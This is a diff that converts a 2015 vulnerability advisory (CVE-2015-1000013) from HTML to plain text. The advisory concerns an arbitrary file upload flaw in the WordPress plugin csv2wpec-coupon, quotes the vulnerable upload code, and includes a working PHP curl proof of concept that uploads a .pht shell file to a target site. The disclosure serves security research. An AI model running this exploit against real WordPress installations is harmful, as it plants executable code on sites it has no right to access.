@@ -1,82 +1,56 @@
-<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN"
-"http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
-<html xmlns="http://www.w3.org/1999/xhtml">
-<head>
-<title></title>
-<meta name="generator" content="HTML::TextToHTML v2.51"/>
-</head>
-<body>
-<p>&lt;html&gt;&lt;title&gt;Vulnerability&lt;/title&gt;&lt;head&gt; &lt;style type="text/css"&gt;&lt;!-- A {text-decoration:none} --&gt;div {
-</p><p>    white-space: pre-wrap;      /* CSS3 <em>/
-    white-space: -moz-pre-wrap; /</em> Firefox <em>/
-    white-space: -pre-wrap;     /</em> Opera &lt;7 <em>/
-    white-space: -o-pre-wrap;   /</em> Opera 7 */
-    word-wrap: break-word;<br/>
-}&lt;/style&gt;&lt;/head&gt;&lt;body alink="<strong>EE0000" link="</strong>0000EE" bgcolor="#333333" text="#000000" vlink="#551A8B"&gt;&lt;center&gt;&lt;table border="0" cellpadding="2" cellspacing="2" width="70%"&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td style="background-color:rgb(150,200,200);font-weight: bold;"&gt;&lt;center&gt;Advisory #: 153&lt;/center&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Title:&lt;/b&gt; Remote file upload vulnerability in wordpress plugin csv2wpec-coupon v1.1&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Author: &lt;/b&gt;Larry W. Cashdollar, @_larry0&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Date:&lt;/b&gt; 2015-09-11&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Download Site:&lt;/b&gt; &lt;a href="<a href="https://wordpress.org/plugins/csv2wpec-coupon">https://wordpress.org/plugins/csv2wpec-coupon</a>"&gt;<a href="https://wordpress.org/plugins/csv2wpec-coupon&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td">https://wordpress.org/plugins/csv2wpec-coupon&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td</a> style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Vendor: &lt;/b&gt;<a href="https://profiles.wordpress.org/esclarmonde/&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td">https://profiles.wordpress.org/esclarmonde/&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td</a> style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Vendor Notified: &lt;/b&gt; 0000-00-00&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Vendor Contact:&lt;/b&gt; &lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Description:&lt;/b&gt; &lt;span style="color: rgb(0, 0, 0); font-family: Times; font-size: medium; font-style: normal; font-variant: normal; font-weight: normal; letter-spacing: normal; line-height: normal; orphans: auto; text-align: start; text-indent: 0px; text-transform: none; white-space: pre-wrap; widows: auto; word-spacing: 0px; -webkit-text-stroke-width: 0px; display: inline !important; float: none;"&gt;Csv2WPeC Coupon provides an easy way to import and export WP e-Commerce Coupon items from and to a CSV file.
-&lt;/span&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Vulnerability:&lt;/b&gt;&lt;div&gt;The code in csv2wpecCoupon_FileUpload.php does not properly sanitize user input, it checks the file mime-type for type x-php but this can be tricked when using the short code for &amp;lt;?php as &amp;lt;? and a file extension of .pht.  This allows a malicious user to upload executable
-files to a vulnerable wordpress installation.
-</p>
-<p>    37                          if ( isset( $<u>FILES[$file</u>type] ) &amp;amp;&amp;amp; !empty( $<u>FILES[$file</u>type] ) ) {
-    38  
-</p><pre>
-    39                                  $file = $<u>FILES[$file</u>type];
-    40                                  $file_error = $file[&amp;#039;error&amp;#039;];
-    41  
-    42                                  if ( $file_error === UPLOAD_ERR_OK ) {
-    43  
-    44                                          $tmp_name = $file[&amp;#039;tmp_name&amp;#039;];
-    45  
-    46                                          $file_type = false;
-    47                                          if( function_exists( &amp;#039;finfo_fopen&amp;#039; ) ) {
-    48                                                  $finfo = finfo_open( FILEINFO_MIME );
-    49                                          $file_type = finfo_file( $finfo, $tmp_name );
-    50                                          finfo_close( $finfo );
-    51                                          }
-    52                                          elseif( function_exists( &amp;#039;mime_content_type&amp;#039; ) ) {
-    53                                                  $file_type  = mime_content_type( $tmp_name );
-    54                                          }
-    55                                          elseif ( !is_dir( $tmp_name ) &amp;amp;&amp;amp; ( $fn = @fopen( $tmp_name , &amp;quot;rb&amp;quot; ) ) ) {
-    56                                                  $bin = fread( $fn, $maxlen = 3072 );
-    57                                                  fclose( $fn );
-    58                                                  if ( strpos( $bin, &amp;quot;&amp;lt;?php&amp;quot; ) !== false )
-    59                                                          $file_type = &amp;quot;application/x-httpd-php&amp;quot;;
-    60                                          }
-</pre>
-<p>    61                  <br/>
-    65  
-</p><pre>
-    66                                          if ( empty ( $file_type ) )
-    67                                                  $file_type = $file[&amp;#039;type&amp;#039;];
-    68  
-    69                                          $csv_mimetypes = array(
-    70                                                  &amp;#039;text/csv&amp;#039;,
-    71                                                  &amp;#039;text/plain&amp;#039;,
-    72                                                  &amp;#039;application/csv&amp;#039;,
-    73                                                  &amp;#039;text/comma-separated-values&amp;#039;,
-    74                                                  &amp;#039;application/excel&amp;#039;,
-    75                                                  &amp;#039;application/vnd.ms-excel&amp;#039;,
-    76                                                  &amp;#039;application/vnd.msexcel&amp;#039;,
-    77                                                  &amp;#039;text/anytext&amp;#039;,
-    78                                                  &amp;#039;application/txt&amp;#039;,
-    79                                          );
-    80  
-    81                                          if( in_array( $file_type, $csv_mimetypes ) ) {
-    82  
-    83                                                  if ( isset( $<u>POST[&amp;#039;UPLOAD</u>DIR&amp;#039;] ) ) {
-    84  
-    85                                                          $wpsc_upload_dir = $<u>POST[&amp;#039;UPLOAD</u>DIR&amp;#039;];
-    86                                                          $dst_name = $file[&amp;#039;name&amp;#039;];
-    87                                                          $dest_file = $wpsc_upload_dir . $dst_name;
-    88                                                          $dest_file = str_replace( &amp;#039;\\&amp;#039;, &amp;#039;/&amp;#039;, $dest_file ); // fix path
-    89  
-    90                                                          if ( move_uploaded_file( $tmp_name, $dest_file ) ) {
-    91                                                                  $<u>SESSION[$dataKey][&amp;#039;file</u>uploaded&amp;#039;] = $dest_file;
-    92                                                                  echo &amp;quot;success&amp;quot;;
-    93                                                          }
-    94  &lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;CVE-2015-1000013&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;JSON:&lt;/b&gt;&lt;a href="json.php?s=153"&gt; Export&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Exploit Code:&lt;/b&gt;&lt;div&gt;&lt;pre class="php" style="font-family:monospace;"&gt;&lt;ol&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;&lt;span style="color: #000000; font-weight: bold;"&gt;&amp;lt;?php&lt;/span&gt;&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;&lt;span style="color: #b1b100;"&gt;echo&lt;/span&gt; &lt;span style="color: #0000ff;"&gt;&amp;quot;Running PoC against target site&amp;lt;br&amp;gt;&amp;quot;&lt;/span&gt;&lt;span style="color: #339933;"&gt;;&lt;/span&gt; &lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;&lt;span style="color: #000088;"&gt;$uploadfile&lt;/span&gt;&lt;span style="color: #339933;"&gt;=&lt;/span&gt;&lt;span style="color: #0000ff;"&gt;&amp;quot;/var/www/s.pht&amp;quot;&lt;/span&gt;&lt;span style="color: #339933;"&gt;;&lt;/span&gt;&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;&lt;span style="color: #000088;"&gt;$ch&lt;/span&gt; &lt;span style="color: #339933;"&gt;=&lt;/span&gt; &lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: bold; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;&lt;a href="<a href="http://www.php.net/curl_init">http://www.php.net/curl_init</a>"&gt;&lt;span style="color: #990000;"&gt;curl_init&lt;/span&gt;&lt;/a&gt;&lt;span style="color: #009900;"&gt;&amp;#40;&lt;/span&gt;&lt;span style="color: #0000ff;"&gt;&amp;quot;<a href="http://192.168.0.47/wp-content/plugins/csv2wpec-coupon/csv2wpecCoupon_FileUpload.php&amp;quot;&lt;/span&gt;&lt;span">http://192.168.0.47/wp-content/plugins/csv2wpec-coupon/csv2wpecCoupon_FileUpload.php&amp;quot;&lt;/span&gt;&lt;span</a> style="color: #009900;"&gt;&amp;#41;&lt;/span&gt;&lt;span style="color: #339933;"&gt;;&lt;/span&gt;&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;&lt;a href="<a href="http://www.php.net/curl_setopt">http://www.php.net/curl_setopt</a>"&gt;&lt;span style="color: #990000;"&gt;curl_setopt&lt;/span&gt;&lt;/a&gt;&lt;span style="color: #009900;"&gt;&amp;#40;&lt;/span&gt;&lt;span style="color: #000088;"&gt;$ch&lt;/span&gt;&lt;span style="color: #339933;"&gt;,&lt;/span&gt; CURLOPT_POST&lt;span style="color: #339933;"&gt;,&lt;/span&gt; &lt;span style="color: #009900; font-weight: bold;"&gt;true&lt;/span&gt;&lt;span style="color: #009900;"&gt;&amp;#41;&lt;/span&gt;&lt;span style="color: #339933;"&gt;;&lt;/span&gt;&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;&lt;a href="<a href="http://www.php.net/curl_setopt">http://www.php.net/curl_setopt</a>"&gt;&lt;span style="color: #990000;"&gt;curl_setopt&lt;/span&gt;&lt;/a&gt;&lt;span style="color: #009900;"&gt;&amp;#40;&lt;/span&gt;&lt;span style="color: #000088;"&gt;$ch&lt;/span&gt;&lt;span style="color: #339933;"&gt;,&lt;/span&gt; CURLOPT_POSTFIELDS&lt;span style="color: #339933;"&gt;,&lt;/span&gt;&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;         &lt;a href="<a href="http://www.php.net/array">http://www.php.net/array</a>"&gt;&lt;span style="color: #990000;"&gt;array&lt;/span&gt;&lt;/a&gt;&lt;span style="color: #009900;"&gt;&amp;#40;&lt;/span&gt;&lt;span style="color: #0000ff;"&gt;'UPLOAD_DIR'&lt;/span&gt;&lt;span style="color: #339933;"&gt;=&amp;gt;&lt;/span&gt;&lt;span style="color: #0000ff;"&gt;'/usr/share/wordpress/wp-content/uploads/'&lt;/span&gt;&lt;span style="color: #339933;"&gt;,&lt;/span&gt;&lt;span style="color: #0000ff;"&gt;'OP_TYPE'&lt;/span&gt;&lt;span style="color: #339933;"&gt;=&amp;gt;&lt;/span&gt;&lt;span style="color: #0000ff;"&gt;'shell'&lt;/span&gt;&lt;span style="color: #339933;"&gt;,&lt;/span&gt;&lt;span style="color: #0000ff;"&gt;'DATA_KEY'&lt;/span&gt;&lt;span style="color: #339933;"&gt;=&amp;gt;&lt;/span&gt;&lt;span style="color: #cc66cc;"&gt;1&lt;/span&gt;&lt;span style="color: #339933;"&gt;,&lt;/span&gt;&lt;span style="color: #0000ff;"&gt;'shell_file'&lt;/span&gt;&lt;span style="color: #339933;"&gt;=&amp;gt;&lt;/span&gt;&lt;span style="color: #0000ff;"&gt;&amp;quot;@&lt;span style="color: #006699; font-weight: bold;"&gt;$uploadfile&lt;/span&gt;&amp;quot;&lt;/span&gt;&lt;span style="color: #339933;"&gt;,&lt;/span&gt;&lt;span style="color: #0000ff;"&gt;'folder'&lt;/span&gt;&lt;span style="color: #339933;"&gt;=&amp;gt;&lt;/span&gt;&lt;span style="color: #0000ff;"&gt;'/usr/share/wordpress/wp-content/uploads/'&lt;/span&gt;&lt;span style="color: #339933;"&gt;,&lt;/span&gt;&lt;span style="color: #0000ff;"&gt;'name'&lt;/span&gt;&lt;span style="color: #339933;"&gt;=&amp;gt;&lt;/span&gt;&lt;span style="color: #0000ff;"&gt;'s.pht'&lt;/span&gt;&lt;span style="color: #009900;"&gt;&amp;#41;&lt;/span&gt;&lt;span style="color: #009900;"&gt;&amp;#41;&lt;/span&gt;&lt;span style="color: #339933;"&gt;;&lt;/span&gt;&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;&lt;a href="<a href="http://www.php.net/curl_setopt">http://www.php.net/curl_setopt</a>"&gt;&lt;span style="color: #990000;"&gt;curl_setopt&lt;/span&gt;&lt;/a&gt;&lt;span style="color: #009900;"&gt;&amp;#40;&lt;/span&gt;&lt;span style="color: #000088;"&gt;$ch&lt;/span&gt;&lt;span style="color: #339933;"&gt;,&lt;/span&gt; CURLOPT_RETURNTRANSFER&lt;span style="color: #339933;"&gt;,&lt;/span&gt; &lt;span style="color: #cc66cc;"&gt;1&lt;/span&gt;&lt;span style="color: #009900;"&gt;&amp;#41;&lt;/span&gt;&lt;span style="color: #339933;"&gt;;&lt;/span&gt;&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: bold; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;&lt;span style="color: #000088;"&gt;$postResult&lt;/span&gt; &lt;span style="color: #339933;"&gt;=&lt;/span&gt; &lt;a href="<a href="http://www.php.net/curl_exec">http://www.php.net/curl_exec</a>"&gt;&lt;span style="color: #990000;"&gt;curl_exec&lt;/span&gt;&lt;/a&gt;&lt;span style="color: #009900;"&gt;&amp;#40;&lt;/span&gt;&lt;span style="color: #000088;"&gt;$ch&lt;/span&gt;&lt;span style="color: #009900;"&gt;&amp;#41;&lt;/span&gt;&lt;span style="color: #339933;"&gt;;&lt;/span&gt;&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;&lt;a href="<a href="http://www.php.net/curl_close">http://www.php.net/curl_close</a>"&gt;&lt;span style="color: #990000;"&gt;curl_close&lt;/span&gt;&lt;/a&gt;&lt;span style="color: #009900;"&gt;&amp;#40;&lt;/span&gt;&lt;span style="color: #000088;"&gt;$ch&lt;/span&gt;&lt;span style="color: #009900;"&gt;&amp;#41;&lt;/span&gt;&lt;span style="color: #339933;"&gt;;&lt;/span&gt;&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;&lt;span style="color: #b1b100;"&gt;print&lt;/span&gt; &lt;span style="color: #0000ff;"&gt;&amp;quot;&lt;span style="color: #006699; font-weight: bold;"&gt;$postResult&lt;/span&gt;&amp;quot;&lt;/span&gt;&lt;span style="color: #339933;"&gt;;&lt;/span&gt; &lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;&lt;span style="color: #000000; font-weight: bold;"&gt;?&amp;gt;&lt;/span&gt;&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;&amp;nbsp;&lt;/div&gt;&lt;/li&gt;&lt;/ol&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Screen Shots:&lt;/b&gt; &lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Advisory:&lt;/b&gt; &lt;a href="<a href="http://www.vapidlabs.com/advisory.php?v=153">http://www.vapidlabs.com/advisory.php?v=153</a>"&gt;<a href="http://www.vapidlabs.com/advisory.php?v=153&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/center&gt;&lt;/body&gt">http://www.vapidlabs.com/advisory.php?v=153&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/center&gt;&lt;/body&gt</a>;
-</pre>
-<p>&lt;/html&gt;
-</p>
-
-</body>
-</html>
+                                 Advisory #: 153
+Title: Remote file upload vulnerability in wordpress plugin csv2wpec-coupon v1.1
+Author:Larry W. Cashdollar, @_larry0
+Date: 2015-09-11
+Download Site: https://wordpress.org/plugins/csv2wpec-coupon
+Vendor:https://profiles.wordpress.org/esclarmonde/
+Vendor Notified: 0000-00-00
+Vendor Contact:
+Description: Csv2WPeC Coupon provides an easy way to import and export WP e-
+Commerce Coupon items from and to a CSV file.
+Vulnerability:
+The code in csv2wpecCoupon_FileUpload.php does not properly sanitize user input,
+it checks the file mime-type for type x-php but this can be tricked when using the
+short code for <?php as <? and a file extension of .pht. This allows a malicious
+user to upload executable files to a vulnerable wordpress installation. 37 if
+( isset( $_FILES[$file_type] ) && !empty( $_FILES[$file_type] ) ) { 38 39 $file =
+$_FILES[$file_type]; 40 $file_error = $file['error']; 41 42 if ( $file_error ===
+UPLOAD_ERR_OK ) { 43 44 $tmp_name = $file['tmp_name']; 45 46 $file_type = false;
+47 if( function_exists( 'finfo_fopen' ) ) { 48 $finfo = finfo_open( FILEINFO_MIME
+); 49 $file_type = finfo_file( $finfo, $tmp_name ); 50 finfo_close( $finfo ); 51 }
+52 elseif( function_exists( 'mime_content_type' ) ) { 53 $file_type =
+mime_content_type( $tmp_name ); 54 } 55 elseif ( !is_dir( $tmp_name ) && ( $fn =
+@fopen( $tmp_name , "rb" ) ) ) { 56 $bin = fread( $fn, $maxlen = 3072 ); 57 fclose
+( $fn ); 58 if ( strpos( $bin, "<?php" ) !== false ) 59 $file_type = "application/
+x-httpd-php"; 60 } 61 65 66 if ( empty ( $file_type ) ) 67 $file_type = $file
+['type']; 68 69 $csv_mimetypes = array( 70 'text/csv', 71 'text/plain', 72
+'application/csv', 73 'text/comma-separated-values', 74 'application/excel', 75
+'application/vnd.ms-excel', 76 'application/vnd.msexcel', 77 'text/anytext', 78
+'application/txt', 79 ); 80 81 if( in_array( $file_type, $csv_mimetypes ) ) { 82
+83 if ( isset( $_POST['UPLOAD_DIR'] ) ) { 84 85 $wpsc_upload_dir = $_POST
+['UPLOAD_DIR']; 86 $dst_name = $file['name']; 87 $dest_file = $wpsc_upload_dir .
+$dst_name; 88 $dest_file = str_replace( '\\', '/', $dest_file ); // fix path 89 90
+if ( move_uploaded_file( $tmp_name, $dest_file ) ) { 91 $_SESSION[$dataKey]
+['file_uploaded'] = $dest_file; 92 echo "success"; 93 } 94
+CVE-2015-1000013
+JSON:Export
+Exploit Code:
+   1. <?php
+   2. echo "Running PoC against target site<br>";
+   3. $uploadfile="/var/www/s.pht";
+   4. $ch =
+   5. curl_init("http://192.168.0.47/wp-content/plugins/csv2wpec-coupon/
+      csv2wpecCoupon_FileUpload.php");
+   6. curl_setopt($ch, CURLOPT_POST, true);
+   7. curl_setopt($ch, CURLOPT_POSTFIELDS,
+   8.          array('UPLOAD_DIR'=>'/usr/share/wordpress/wp-content/uploads/
+      ','OP_TYPE'=>'shell','DATA_KEY'=>1,'shell_file'=>"@$uploadfile",'folder'=>'/
+      usr/share/wordpress/wp-content/uploads/','name'=>'s.pht'));
+   9. curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+  10. $postResult = curl_exec($ch);
+  11. curl_close($ch);
+  12. print "$postResult";
+  13. ?>
+  14.  
+Screen Shots:
+Advisory: http://www.vapidlabs.com/advisory.php?v=153
